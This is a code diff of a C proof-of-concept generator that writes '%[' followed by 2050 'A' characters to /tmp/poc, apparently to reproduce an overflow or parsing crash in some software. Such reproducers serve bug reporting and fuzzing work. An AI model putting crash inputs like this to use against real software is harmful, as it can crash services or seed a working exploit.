@@ -1,17 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 
-int main() {
-    unsigned char poc[] = {0x00};
-    size_t poc_len = sizeof(poc);
-
+int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
-    if (!f) { 
-        printf("Error opening file\n");
-        return 1; 
+    if (!f) { perror("fopen"); return 1; }
+    fputc('%', f);
+    fputc('[', f);
+    for (int i = 0; i < 2050; i++) {
+        fputc('A', f);
     }
-    fwrite(poc, 1, poc_len, f);
     fclose(f);
     return 0;
 }
